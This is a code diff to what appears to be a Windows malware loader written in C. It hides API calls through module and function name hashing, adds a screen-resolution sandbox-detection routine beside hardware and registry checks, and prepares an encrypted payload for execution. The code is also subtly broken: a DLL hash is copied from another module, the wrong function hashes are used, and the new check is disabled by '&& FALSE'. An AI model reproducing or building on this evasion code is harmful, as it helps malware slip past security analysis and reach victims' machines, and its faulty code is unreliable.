@@ -15,7 +15,7 @@
 
 #define KERNEL32DLL_HASH 0x367DC15A
 #define USER32DLL_HASH 0x81E3778E
-#define ADVAPI32DLL_HASH 0x00367fD5
+#define ADVAPI32DLL_HASH 0x367DC15A
 #define VirtualAlloc_HASH 0xF625556A
 #define GetSystemInfo_HASH 0x4BC8FCDF
 #define GlobalMemoryStatusEx_HASH 0x7CF2036B
@@ -213,23 +213,63 @@ FARPROC get_proc_address_hash(HMODULE module, DWORD hashed_name) {
 	return NULL;
 }
 
+// Section could be API hashed maybe
+BOOL CALLBACK resolution_callback(HMONITOR monitor, HDC hdc, LPRECT lprect, LPARAM ldata) {
+
+	int X = 0, Y = 0;
+	MONITORINFO MI = { .cbSize = sizeof(MONITORINFO) };
+
+	if (!GetMonitorInfoW(monitor, &MI)) {
+		return FALSE;
+	}
+
+	// Calculating the X coordinates of the desplay
+	X = MI.rcMonitor.right - MI.rcMonitor.left;
+
+	// Calculating the Y coordinates of the desplay
+	Y = MI.rcMonitor.top - MI.rcMonitor.bottom;
+
+	// If numbers are in negative value, reverse them 
+	if (X < 0)
+		X = -X;
+	if (Y < 0)
+		Y = -Y;
+
+	if ((X != 1920 && X != 2560 && X != 1440) || (Y != 1080 && Y != 1200 && Y != 1600 && Y != 900))
+		*((BOOL*)ldata) = TRUE; // sandbox is detected
+
+	return TRUE;
+}
+
+
+BOOL check_resolution() {
+
+	BOOL	SANDBOX = FALSE;
+
+	// SANDBOX will be set to TRUE by 'EnumDisplayMonitors' if a sandbox is detected
+	EnumDisplayMonitors(NULL, NULL, (MONITORENUMPROC)resolution_callback, (LPARAM)(&SANDBOX));
+
+	return SANDBOX;
+}
+
 int main() {
 	// Retrieves the handle to kernel32.dll
 	HMODULE kernel32_module = get_module_handle_hash(KERNEL32DLL_HASH);
 	// We need to load these libraries to access registry values and the screen resolution
 	LoadLibraryA("User32.dll");
+	LoadLibraryA("Advapi32.dll");
 
-	HMODULE user32_module = get_module_handle_hash(USER32DLL_HASH);
+	HMODULE advapi32_module = get_module_handle_hash(ADVAPI32DLL_HASH);
 
 	// This section checks the hardware of the system for anything that might 
 	// suggest a sandbox
 	{
 		fnGetSystemInfo myGetSystemInfo = get_proc_address_hash(kernel32_module, GetSystemInfo_HASH);
 		fnGlobalMemoryStatusEx myGlobalMemoryStatusEx = get_proc_address_hash(kernel32_module, GlobalMemoryStatusEx_HASH);
-		fnRegOpenKeyExA myRegOpenKeyExA = get_proc_address_hash(user32_module, GlobalMemoryStatusEx_HASH);
-		fnRegQueryInfoKeyA myRegQueryInfoKeyA = get_proc_address_hash(user32_module, GlobalMemoryStatusEx_HASH);
-		fnGetMonitorInfoW myGetMonitorInfoW = get_proc_address_hash(user32_module, GetMonitorInfoW_HASH);
-		fnEnumDisplayMonitors myEnumDisplayMonitors = get_proc_address_hash(user32_module, EnumDisplayMonitors_HASH);
+		fnRegOpenKeyExA myRegOpenKeyExA = get_proc_address_hash(advapi32_module, GlobalMemoryStatusEx_HASH);
+		fnRegQueryInfoKeyA myRegQueryInfoKeyA = get_proc_address_hash(advapi32_module, GlobalMemoryStatusEx_HASH);
+		// fnGetMonitorInfoW myGetMonitorInfoW = get_proc_address_hash(user32_module, GetMonitorInfoW_HASH);
+		// fnEnumDisplayMonitors myEnumDisplayMonitors = get_proc_address_hash(user32_module, EnumDisplayMonitors_HASH);
 		
 		SYSTEM_INFO	sys_info = { 0 };
 		MEMORYSTATUSEX mem_status = { .dwLength = sizeof(MEMORYSTATUSEX) };
@@ -264,6 +304,12 @@ int main() {
 		}
 		
 		// RegCloseKey(hkey);
+
+		// Check the resolution
+		/* NOTE: Might fail on your system if you have a non-standard resolution */
+		if (check_resolution() && FALSE) {
+			return;
+		}
 	}
 
 	SIZE_T len = sizeof(encrypted_payload);
